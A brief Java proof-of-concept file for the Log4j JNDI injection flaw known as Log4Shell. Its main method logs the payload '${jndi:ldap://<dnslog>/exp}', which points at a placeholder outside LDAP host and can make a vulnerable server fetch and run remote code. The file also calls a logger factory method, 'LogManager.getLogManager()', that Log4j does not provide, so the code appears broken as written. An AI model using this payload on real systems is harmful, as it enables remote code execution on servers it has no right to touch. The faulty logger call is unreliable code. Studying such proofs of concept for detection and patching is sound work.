
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

public class Main {
    private static final Logger LOGGER = LogManager.getLogManager();

    public static void main(String[] args) throws Exception{
        String poc = "${jndi:ldap://<dnslog>/exp}";
        LOGGER.error(poc);
    }
    
}